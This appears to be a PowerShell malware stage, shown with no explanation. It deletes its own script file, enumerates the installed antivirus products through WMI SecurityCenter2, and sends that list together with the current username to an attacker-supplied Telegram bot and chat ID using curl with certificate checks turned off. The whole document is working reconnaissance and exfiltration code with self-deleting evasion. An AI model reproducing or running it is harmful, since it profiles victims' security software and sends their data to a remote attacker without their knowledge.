<##>
$token = $args[0];
$chat_id = $args[1];

$filename = $MyInvocation.MyCommand.Definition.ToString();
Remove-Item -Path $filename -Force;

function Get_AntiVirus{
	[CmdletBinding()] param ([parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)][Alias('name')] $computername=$env:computername);
	$AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $computername;
	$ret = "";
	foreach($AntiVirusProduct in $AntiVirusProducts){
		 $ret += "%E2%9D%96 " + $AntiVirusProduct.displayName + "%0A";
	}
	if ($ret -eq ""){
		$ret = "%E2%9D%96 No AntiVirus";
	}
	return $ret;
}

function Send_Message(){
	$url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "--$env:Username--&chat_id=" + $chat_id;
	cmd.exe /c curl $url -s -k;
}
$message = Get_AntiVirus;
Send_Message;
	